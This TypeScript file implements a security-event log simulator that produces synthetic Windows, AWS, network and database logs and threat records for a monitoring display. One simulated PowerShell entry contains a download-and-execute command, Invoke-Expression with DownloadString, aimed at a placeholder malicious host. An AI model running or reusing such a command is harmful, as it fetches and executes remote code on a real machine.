import { v4 as uuidv4 } from 'uuid';

// Types
interface SimulatedLog {
  id: string;
  timestamp: string;
  source: string;
  level: string;
  message: string;
  details: Record<string, any>;
}

interface SimulatedThreat {
  id: string;
  title: string;
  description: string;
  timestamp: string;
  severity: string;
  status: string;
  source: string;
  type: string;
  indicators: string[];
  related_logs: string[];
  anomaly_score: number;
  user?: string;
  actions?: string[];
  details?: Record<string, any>;
}

interface ThreatPattern {
  type: string;
  title: string;
  description: string;
  severity: string;
  source: string;
  indicators: string[];
}

// Windows event sources and event IDs
const windowsEventSources = [
  "Windows-Security",
  "Windows-System",
  "Windows-Application",
  "Windows-PowerShell/Operational",
  "Windows-Sysmon/Operational",
  "Windows-Defender/Operational"
];

const awsEventSources = [
  "AWS-CloudTrail",
  "AWS-GuardDuty",
  "AWS-SecurityHub"
];

const networkEventSources = [
  "Network-Firewall",
  "Network-IDS",
  "Network-Router"
];

const databaseEventSources = [
  "Database-MySQL",
  "Database-PostgreSQL",
  "Database-SQLServer"
];

const windowsSecurityEvents = [
  { id: 4624, description: "Successful account login", level: "info" },
  { id: 4625, description: "Failed account login attempt", level: "warning" },
  { id: 4634, description: "An account was logged off", level: "info" },
  { id: 4648, description: "A logon was attempted using explicit credentials", level: "warning" },
  { id: 4672, description: "Special privileges assigned to new logon", level: "warning" },
  { id: 4688, description: "A new process has been created", level: "info" },
  { id: 4720, description: "A user account was created", level: "warning" },
  { id: 4722, description: "A user account was enabled", level: "info" },
  { id: 4724, description: "An attempt was made to reset an account's password", level: "warning" },
  { id: 4728, description: "A member was added to a security-enabled global group", level: "warning" },
  { id: 4732, description: "A member was added to a security-enabled local group", level: "warning" },
  { id: 4738, description: "A user account was changed", level: "info" },
  { id: 4740, description: "A user account was locked out", level: "warning" },
  { id: 4756, description: "A member was added to a security-enabled universal group", level: "warning" },
  { id: 5156, description: "The Windows Filtering Platform permitted a connection", level: "info" },
  { id: 5157, description: "The Windows Filtering Platform blocked a connection", level: "warning" },
  { id: 7045, description: "A service was installed in the system", level: "warning" },
  { id: 8004, description: "Antimalware scan results", level: "info" },
  { id: 1102, description: "The audit log was cleared", level: "error" }
];

const threatPatterns: ThreatPattern[] = [
  {
    type: "brute force",
    title: "Brute Force Attack Detected",
    description: "Multiple failed login attempts from same source",
    severity: "high",
    source: "Windows-Security",
    indicators: ["Multiple 4625 events", "Same source IP", "Different account names"]
  },
  {
    type: "malware",
    title: "Malware Activity Detected",
    description: "Suspicious process execution pattern identified",
    severity: "critical",
    source: "Windows-Defender/Operational",
    indicators: ["Suspicious file hash", "Unusual process tree", "Known malware patterns"]
  },
  {
    type: "unauthorized access",
    title: "Unauthorized Access Attempt",
    description: "Attempt to access restricted resource",
    severity: "medium",
    source: "Windows-Security",
    indicators: ["Access denied event", "Non-business hours", "Sensitive resource"]
  },
  {
    type: "privilege escalation",
    title: "Privilege Escalation Detected",
    description: "User gained elevated privileges through suspicious means",
    severity: "high",
    source: "Windows-Security",
    indicators: ["Special privileges assigned", "Unusual group membership change", "Admin commands executed"]
  },
  {
    type: "data exfiltration",
    title: "Potential Data Exfiltration",
    description: "Unusual outbound data transfer detected",
    severity: "high",
    source: "Network-IDS",
    indicators: ["Large outbound transfer", "Unusual destination", "Sensitive file access"]
  },
  {
    type: "anomaly",
    title: "System Behavior Anomaly",
    description: "Unusual system behavior detected by analysis engine",
    severity: "medium",
    source: "Windows-System",
    indicators: ["Unusual process relationship", "Statistical deviation", "Time-based anomaly"]
  }
];

const users = [
  "administrator", "system", "john.doe", "sarah.smith", "helpdesk",
  "backup_svc", "dev_user", "web_admin", "db_admin", "guest"
];

const generateRandomIP = () => {
  return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

class WindowsEventLogSimulator {
  private lastSimulatedTime: Date;
  private recentLogs: SimulatedLog[] = [];
  private activeThreats: SimulatedThreat[] = [];
  private previousThreatTypes: Map<string, number> = new Map();

  constructor() {
    this.lastSimulatedTime = new Date();
    
    this.generateInitialThreats();
  }

  private generateInitialThreats(): void {
    const threatCount = Math.floor(Math.random() * 3) + 3;
    const threatTypes = ["brute force", "malware", "unauthorized access", "privilege escalation", "data exfiltration", "anomaly"];
    
    const selectedTypes = new Set();
    while (selectedTypes.size < Math.min(threatCount, threatTypes.length)) {
      selectedTypes.add(threatTypes[Math.floor(Math.random() * threatTypes.length)]);
    }
    
    Array.from(selectedTypes).forEach(type => {
      const threat = this.createNewThreat(
        type as string,
        users[Math.floor(Math.random() * users.length)],
        generateRandomIP()
      );
      
      this.previousThreatTypes.set(type as string, Date.now());
    });
  }

  public generateLogs(count: number = 10): SimulatedLog[] {
    const newLogs: SimulatedLog[] = [];
    
    for (let i = 0; i < count; i++) {
      const isThreatLog = Math.random() < 0.1;
      
      if (isThreatLog) {
        newLogs.push(this.generateThreatLog());
      } else {
        newLogs.push(this.generateNormalLog());
      }
      
      this.lastSimulatedTime = new Date(this.lastSimulatedTime.getTime() + (Math.random() * 4000 + 1000));
    }
    
    this.recentLogs = [...newLogs, ...this.recentLogs].slice(0, 100);
    
    return newLogs;
  }

  private generateNormalLog(): SimulatedLog {
    const sourceType = Math.random();
    let source;
    
    if (sourceType < 0.6) {
      source = windowsEventSources[Math.floor(Math.random() * windowsEventSources.length)];
    } else if (sourceType < 0.8) {
      source = awsEventSources[Math.floor(Math.random() * awsEventSources.length)];
    } else if (sourceType < 0.9) {
      source = networkEventSources[Math.floor(Math.random() * networkEventSources.length)];
    } else {
      source = databaseEventSources[Math.floor(Math.random() * databaseEventSources.length)];
    }
    
    if (source === "Windows-Security") {
      const event = windowsSecurityEvents[Math.floor(Math.random() * windowsSecurityEvents.length)];
      const user = users[Math.floor(Math.random() * users.length)];
      const ip = generateRandomIP();
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source,
        level: event.level,
        message: `Event ID ${event.id}: ${event.description} for user ${user} from ${ip}`,
        details: {
          event_id: event.id,
          user,
          ip_address: ip,
          process_id: Math.floor(Math.random() * 10000) + 1000,
          success: event.level === "info"
        }
      };
    } 
    
    if (source.includes("AWS")) {
      const actions = ["ListBuckets", "GetObject", "PutObject", "CreateUser", "AssumeRole"];
      const regions = ["us-east-1", "us-west-2", "eu-west-1"];
      const action = actions[Math.floor(Math.random() * actions.length)];
      const region = regions[Math.floor(Math.random() * regions.length)];
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source,
        level: Math.random() < 0.8 ? "info" : "warning",
        message: `AWS API call: ${action} performed in ${region}`,
        details: {
          action,
          region,
          resource_id: `arn:aws:${Math.random().toString(36).substring(2, 8)}`,
          user_identity: users[Math.floor(Math.random() * users.length)]
        }
      };
    }
    
    if (source.includes("Network")) {
      const protocols = ["TCP", "UDP", "HTTP", "HTTPS"];
      const protocol = protocols[Math.floor(Math.random() * protocols.length)];
      const srcIp = generateRandomIP();
      const dstIp = generateRandomIP();
      const ports = [22, 80, 443, 3389, 8080, 3306];
      const port = ports[Math.floor(Math.random() * ports.length)];
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source,
        level: Math.random() < 0.8 ? "info" : "warning",
        message: `${protocol} connection from ${srcIp} to ${dstIp}:${port} ${Math.random() < 0.9 ? "allowed" : "blocked"}`,
        details: {
          protocol,
          src_ip: srcIp,
          dst_ip: dstIp,
          dst_port: port,
          bytes_transferred: Math.floor(Math.random() * 100000)
        }
      };
    }
    
    if (source.includes("Database")) {
      const queryTypes = ["SELECT", "INSERT", "UPDATE", "DELETE"];
      const tables = ["users", "products", "orders", "logs", "sessions"];
      const queryType = queryTypes[Math.floor(Math.random() * queryTypes.length)];
      const table = tables[Math.floor(Math.random() * tables.length)];
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source,
        level: Math.random() < 0.9 ? "info" : "warning",
        message: `Database query: ${queryType} on table ${table} completed successfully`,
        details: {
          query_type: queryType,
          table,
          duration_ms: Math.floor(Math.random() * 1000),
          rows_affected: Math.floor(Math.random() * 100),
          user: users[Math.floor(Math.random() * users.length)]
        }
      };
    }
    
    const messages = [
      "Service started successfully",
      "Application launched",
      "System resource usage normal",
      "Scheduled task completed",
      "Driver loaded successfully"
    ];
    
    return {
      id: uuidv4(),
      timestamp: this.lastSimulatedTime.toISOString(),
      source,
      level: "info",
      message: messages[Math.floor(Math.random() * messages.length)],
      details: {
        process_name: ["svchost.exe", "explorer.exe", "chrome.exe", "taskmgr.exe"][Math.floor(Math.random() * 4)],
        process_id: Math.floor(Math.random() * 10000) + 1000
      }
    };
  }

  private generateThreatLog(): SimulatedLog {
    if (this.activeThreats.length > 0 && Math.random() < 0.8) {
      const threat = this.activeThreats[Math.floor(Math.random() * this.activeThreats.length)];
      
      if (threat.type === "brute force") {
        const user = users[Math.floor(Math.random() * users.length)];
        const ip = threat.details?.ip_address || generateRandomIP();
        
        return {
          id: uuidv4(),
          timestamp: this.lastSimulatedTime.toISOString(),
          source: "Windows-Security",
          level: "warning",
          message: `Event ID 4625: Failed account login attempt for user ${user} from ${ip}`,
          details: {
            event_id: 4625,
            user,
            ip_address: ip,
            failure_reason: "Invalid password",
            related_threat: threat.id
          }
        };
      }
      
      if (threat.type === "malware") {
        return {
          id: uuidv4(),
          timestamp: this.lastSimulatedTime.toISOString(),
          source: "Windows-Defender/Operational",
          level: "error",
          message: "Malware detected: Suspicious file activity identified",
          details: {
            malware_name: threat.details?.malware_name || "Suspicious.GenericML",
            file_path: threat.details?.file_path || "C:\\Users\\Administrator\\Downloads\\invoice.exe",
            action_taken: "Quarantined",
            related_threat: threat.id
          }
        };
      }
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source: threat.source,
        level: threat.severity === "critical" || threat.severity === "high" ? "error" : "warning",
        message: `Activity related to ${threat.type} threat detected`,
        details: {
          related_threat: threat.id,
          user: threat.user || users[Math.floor(Math.random() * users.length)]
        }
      };
    }
    
    const threatEvent = Math.random();
    
    if (threatEvent < 0.3) {
      const user = users[Math.floor(Math.random() * users.length)];
      const ip = generateRandomIP();
      
      if (Math.random() < 0.1) {
        this.createNewThreat("brute force", user, ip);
      }
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source: "Windows-Security",
        level: "warning",
        message: `Event ID 4625: Failed account login attempt for user ${user} from ${ip}`,
        details: {
          event_id: 4625,
          user,
          ip_address: ip,
          failure_reason: "Invalid password"
        }
      };
    }
    
    if (threatEvent < 0.6) {
      const filePaths = [
        "C:\\Users\\Administrator\\Downloads\\invoice.pdf.exe",
        "C:\\Program Files\\Temp\\svchost.exe",
        "C:\\Windows\\System32\\rundIl32.exe",
        "C:\\Users\\Public\\suspicious.dll"
      ];
      const filePath = filePaths[Math.floor(Math.random() * filePaths.length)];
      
      if (Math.random() < 0.1) {
        this.createNewThreat("malware", users[Math.floor(Math.random() * users.length)], generateRandomIP(), filePath);
      }
      
      return {
        id: uuidv4(),
        timestamp: this.lastSimulatedTime.toISOString(),
        source: "Windows-Sysmon/Operational",
        level: "error",
        message: "Suspicious process created with potential malware indicators",
        details: {
          process_name: filePath.split("\\").pop(),
          file_path: filePath,
          command_line: filePath + " -silent",
          user: users[Math.floor(Math.random() * users.length)]
        }
      };
    }
    
    const suspiciousActivities = [
      {
        source: "Windows-Security",
        level: "warning",
        message: "Event ID 4732: User added to the local administrators group",
        details: {
          event_id: 4732,
          user: users[Math.floor(Math.random() * users.length)],
          group: "Administrators",
          performed_by: users[Math.floor(Math.random() * users.length)]
        }
      },
      {
        source: "Network-IDS",
        level: "warning",
        message: "Unusual outbound connection to known malicious IP",
        details: {
          src_ip: generateRandomIP(),
          dst_ip: "185.128.41." + Math.floor(Math.random() * 255),
          dst_port: 445,
          protocol: "TCP"
        }
      },
      {
        source: "Windows-PowerShell/Operational",
        level: "warning",
        message: "Suspicious PowerShell command execution",
        details: {
          command: "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.example.com/script.ps1')",
          user: users[Math.floor(Math.random() * users.length)]
        }
      }
    ];
    
    const activity = suspiciousActivities[Math.floor(Math.random() * suspiciousActivities.length)];
    
    if (Math.random() < 0.1) {
      const threatTypes = ["unauthorized access", "privilege escalation", "data exfiltration", "anomaly"];
      this.createNewThreat(
        threatTypes[Math.floor(Math.random() * threatTypes.length)], 
        activity.details.user || users[Math.floor(Math.random() * users.length)],
        activity.details.src_ip || generateRandomIP()
      );
    }
    
    return {
      id: uuidv4(),
      timestamp: this.lastSimulatedTime.toISOString(),
      source: activity.source,
      level: activity.level,
      message: activity.message,
      details: activity.details
    };
  }

  private createNewThreat(type: string, user?: string, ip?: string, filePath?: string): SimulatedThreat {
    const pattern = threatPatterns.find(p => p.type === type) || threatPatterns[0];
    
    let details: Record<string, any> = {};
    
    if (type === "brute force") {
      details = {
        ip_address: ip,
        failed_attempts: Math.floor(Math.random() * 10) + 5,
        time_window_minutes: Math.floor(Math.random() * 10) + 1,
        response_time_seconds: Math.floor(Math.random() * 50) + 5
      };
    } else if (type === "malware") {
      details = {
        malware_name: ["Trojan.Generic", "Ransomware.Cryptolocker", "Backdoor.Bot", "Exploit.PDF"][Math.floor(Math.random() * 4)],
        file_path: filePath || "C:\\Users\\Administrator\\Downloads\\invoice.exe",
        hash: "a1b2c3d4e5f6" + Math.random().toString(36).substring(2, 10),
        response_time_seconds: Math.floor(Math.random() * 30) + 5
      };
    } else {
      details = {
        response_time_seconds: Math.floor(Math.random() * 120) + 10
      };
    }
    
    const uniqueId = uuidv4();
    
    const threat: SimulatedThreat = {
      id: uniqueId,
      title: pattern.title,
      description: pattern.description,
      timestamp: this.lastSimulatedTime.toISOString(),
      severity: pattern.severity,
      status: "active",
      source: pattern.source,
      type: pattern.type,
      indicators: [...pattern.indicators],
      related_logs: [],
      anomaly_score: Math.random() * 0.5 + 0.5,
      user,
      details
    };
    
    this.previousThreatTypes.set(type, Date.now());
    
    this.activeThreats.push(threat);
    
    return threat;
  }

  public getRecentLogs(): SimulatedLog[] {
    return this.recentLogs;
  }

  public getThreats(): SimulatedThreat[] {
    this.activeThreats.forEach(threat => {
      if (Math.random() < 0.3) {
        const age = new Date().getTime() - new Date(threat.timestamp).getTime();
        
        if (age > 30 * 60 * 1000 && Math.random() < 0.2) {
          threat.status = "resolved";
          threat.actions = ["Blocked", "Quarantined", "Alert sent"];
        }
      }
    });
    
    this.activeThreats = this.activeThreats.filter(threat => {
      const age = new Date().getTime() - new Date(threat.timestamp).getTime();
      return threat.status === "active" || age < 60 * 60 * 1000;
    });
    
    const now = Date.now();
    const availableTypes = threatPatterns.filter(p => {
      const lastAdded = this.previousThreatTypes.get(p.type) || 0;
      return (now - lastAdded) > 180000;
    });
    
    if (availableTypes.length > 0 && Math.random() < 0.1) {
      const typeIndex = Math.floor(Math.random() * availableTypes.length);
      const threatType = availableTypes[typeIndex].type;
      this.createNewThreat(threatType, users[Math.floor(Math.random() * users.length)], generateRandomIP());
    }
    
    return this.activeThreats;
  }
}

const logSimulator = new WindowsEventLogSimulator();

export default logSimulator;
